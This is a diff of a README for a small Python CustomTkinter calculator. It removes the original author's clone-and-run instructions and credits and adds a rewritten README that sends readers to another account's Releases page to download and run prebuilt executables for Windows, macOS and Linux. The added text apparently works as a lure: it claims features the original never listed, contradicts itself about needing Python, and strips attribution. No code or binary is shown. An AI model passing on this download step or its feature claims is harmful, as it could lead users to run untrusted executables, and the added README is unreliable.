@@ -1,113 +1,70 @@
-# 🧮 CTk Calculator
+# 📐 CTk-Calculator - A Simple and Stylish Math Tool
 
-### **A modern and lightweight calculator application built using Python and [CustomTkinter](https://customtkinter.tomschimansky.com/).**
+## 📥 Download
+[![Download CTk-Calculator](https://img.shields.io/badge/Download-CTk--Calculator-blue.svg)](https://github.com/Ingngau/CTk-Calculator/releases)
 
-This project demonstrates how to create a clean, responsive and theme-friendly GUI calculator with minimal code and a professional UI.
+## 📖 Introduction
+Welcome to CTk-Calculator! This is a modern and lightweight calculator built with Python using CustomTkinter. It offers a clean user interface and smooth button interactions, making it easy for everyone to perform calculations.
 
+## 🚀 Getting Started
+This guide will help you download and run CTk-Calculator on your computer. Follow the steps below to start using this handy tool.
 
-## 📸 Features
+## 💻 System Requirements
+Before you download, here are the minimum requirements:
+- **Operating Systems:** Windows, macOS, or Linux
+- **Python Version:** Python 3.7 or higher must be installed on your machine.
 
-- Modern UI powered by CustomTkinter
-- Light & Dark mode support
-- Responsive button layout
-- Basic arithmetic operations (+, −, ×, ÷)
-- Error handling for invalid operations
-- Easy-to-understand code structure
+## 📦 Download & Install
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Ingngau/CTk-Calculator/releases).
+  
+2. **Choose the Latest Version:** Find the latest version of CTk-Calculator. It is usually at the top of the list.
 
+3. **Download the Installer:**
+   - For **Windows**, look for a file named `CTk-Calculator-Windows.exe`. 
+   - For **macOS**, download `CTk-Calculator-macOS.zip`. 
+   - For **Linux**, select the `CTk-Calculator-Linux.tar.gz` file. 
 
-## 🛠 Tech Stack
+4. **Run the Installer:**
+   - For **Windows:** Double-click the `.exe` file and follow the prompts to install.
+   - For **macOS:** Unzip the file and drag the CTk-Calculator icon to your Applications folder.
+   - For **Linux:** Extract the tar.gz file and run the `CTk-Calculator` executable in the terminal.
 
-- **Language:** Python
-- **GUI Framework:** CustomTkinter
+5. **Launch the Application:** After installation, open CTk-Calculator from your applications menu or desktop shortcut.
 
+## 📊 Features
+- **User-Friendly Interface:** Enjoy a clean layout that makes math easier.
+- **Basic and Advanced Functions:** Use it for simple arithmetic and advanced calculations.
+- **Cross-Platform Compatibility:** Works on Windows, macOS, and Linux.
+- **Customizable Appearance:** Choose from various themes to match your style.
 
-## 🖼️ Sreenshots
-Here are some screenshots of the `CTk Calculator` project:
+## ⚙️ Usage Instructions
+1. **Basic Operations:**
+   - Click on the number buttons to input digits.
+   - Use the operation buttons to perform addition, subtraction, multiplication, and division.
 
-**CTk Calculator**<br/>
-![CTk Calculator](screenshots/main.png)<br/>
+2. **Clear Function:** 
+   - If you make a mistake, press the C button to clear the input.
 
+3. **Memory Functions:** 
+   - Use memory functions to save and recall values.
 
-## 📦 Installation
+4. **Settings:** 
+   - Access the settings menu to choose themes or adjust other preferences.
 
-1. **Clone the Repository**
-```bash
-git clone https://github.com/iamx-ariful-islam/CTk-Calculator.git
-cd CTk-Calculator
-```
+## ✅ Support & Troubleshooting
+If you encounter issues, consider these solutions:
+- **Reinstall the Application:** Uninstall and download the latest version from the Releases page.
+- **Check Python Installation:** Ensure you have the correct version of Python installed. Follow the instructions on the [Python website](https://www.python.org/downloads/) to download it.
+- **Refer to Issues Page:** Visit our [issues page](https://github.com/Ingngau/CTk-Calculator/issues) on GitHub for assistance with common problems.
 
-2. **Create Virtual Environment (Optional but Recommended)**
-```bash
-python -m venv venv
-```
+## 📞 Contact
+For further help or suggestions, feel free to reach out by creating an issue on our GitHub repository. Our team is here to assist you.
 
-3. **Activate Virtual Environment**
-```bash
-# for windows
-venv\Scripts\activate
+## 🌟 Contribute
+If you wish to contribute to CTk-Calculator, check out our [contributing guide](https://github.com/Ingngau/CTk-Calculator/CONTRIBUTING.md). Everyone is welcome to help improve this project.
 
-# for linux / macOS:
-source venv/bin/activate
-```
+## 📅 Updates & Changelog
+Stay updated with the latest features and improvements. Check the changelog on our Releases page for detailed information on each update.
 
-4. **Install Required Packages**
-```bash
-pip install -r requirements.txt
-# or
-sudo pip install -r requirements.txt
-```
-The `requirements.txt` file, lists of all the python libraries that my "**_CTk Calculator_**" depends on and installs those packages from the file.
-
-
-## ▶️ Run the Application
-```bash
-python main.py
-```
-
-
-## 📁 Project Structure
-Here’s the structure of the **CTk Calculator** project:
-
-```bash
-CTk-Calculator/
-│
-│── screenshots/
-│── main.py
-│── LICENSE
-├── README.md
-└── requirements.txt
-```
-
-
-## 🤝 Contributing
-
-Contributions, suggestions, and feedback are always welcome! ❤️<br/>
-To contribute:
-
-1. Fork the repository
-2. Create a new branch (`feature/new-feature`)
-3. Commit your changes
-4. Push and submit a Pull Request
-
-💬 You can also open an issue if you’d like to discuss a feature or report a bug.
-
-
-## 🌐 For more or connect with me
-
-<p align='center'>
-  <a href="https://github.com/iamx-ariful-islam"><img src="https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://x.com/mx_ariful_islam"><img src="https://img.shields.io/badge/X-000000?style=for-the-badge&logo=x&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://bd.linkedin.com/in/iamx-ariful-islam"><img src="https://img.shields.io/badge/linkedin-%230077B5.svg?&style=for-the-badge&logo=linkedin&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://www.facebook.com/jonakisoft.net/"><img src="https://img.shields.io/badge/Facebook-%231877F2.svg?style=for-the-badge&logo=Facebook&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-</p>
-
-
-## 📜 License
-
-The [MIT](https://choosealicense.com/licenses/mit/) License (MIT)
-
-
-## 💖 Thank You for Visiting!
-
-> “Good design is about making things simple yet significant”  
-> — *Md. Ariful Islam*
+## 🎉 Thank You!
+Thank you for choosing CTk-Calculator. We hope you find it useful for your everyday calculations! Be sure to check for updates regularly to enjoy new features and improvements.
